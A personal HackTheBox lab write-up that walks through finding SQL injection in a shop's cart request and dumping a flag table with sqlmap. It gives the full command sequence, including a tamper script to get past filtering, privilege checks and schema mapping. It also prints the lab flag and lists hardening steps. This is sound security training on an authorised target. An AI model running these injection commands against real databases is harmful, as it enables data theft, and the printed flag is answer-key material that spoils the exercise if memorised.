---
platform: hackthebox
difficulty: Easy
status: Completed
date: 2026-10-22
tags:
  - difficulty/easy
---
# HTB: Skills Assessment SQLMap

**Target:** 
`154.57.164.72:39803`


---

## 01 - Scope
### Assignment:
You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.
### Objectives:
- **Primary Goals:**
  - [x] What's the contents of table final_flag?
`HTB{n07_50_h4rd_r16h7?!}`
---

## 02 - Procedure
1. First I checked the website to see what we are dealing with:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022082601.png)

2. I then started `mapping` forms, but `sqlmap` didn't had a successful find:
```bash
sqlmap -u "http://154.57.164.72:39803/" --forms --crawl=2 --batch --level=3
```

3. So I checked the forms manually and eventually found, that when adding an item to the cart, there's a  `SQL query`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022090349.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022090449.png)

4. I therefor fed the `HTTP-Post` Request to `sqlmap` and let it run:
```bash
sqlmap -r cart --batch
```
Alright, looks good so far! Important to note is, that the `tamper` script `between` is needed:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022090846.png)

5. I then checked if our DB-user is `Databasse Admin`:
```bash
sqlmap -r cart --batch --tamper="between" --is-dba
```
He's not:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022091205.png)

6. So I checked the `privileges` of our current user, which aren't extraordinary:
```bash
sqlmap -r cart --batch --tamper="between" --privileges
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022092011.png)

7. Afterwards I mapped the `DB-Schema` in order to find the `final_flag` table, which was successful:
```bash
sqlmap -r cart --batch --tamper="between" --schema --exclude-sysdbs
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022092842.png)

8. Next up I continued with querying the `final_flag` tables columns:
```bash
sqlmap -r cart --batch --tamper="between" -D production -T final_flag --columns --no-cast
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022093401.png)

9. And then retrieved the flags content:
```bash
sqlmap -r cart --batch --tamper="between" -D production -T final_flag -C content --dump --no-cast
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261022093703.png)


## 03 - Hardening Steps 
1. Switch to `Perpared Statements` or `Parameterized queries` in order to make injections useless.
2. Implement `Input Validation` on forms, e.g. `ID` can only be a number.
3. Restrict `DB user privilege` even more, so that he only has access to needed tables, such as `cart items`

## 10 - Lesson Learned
`Time-based SQLi` requires a lot of patience.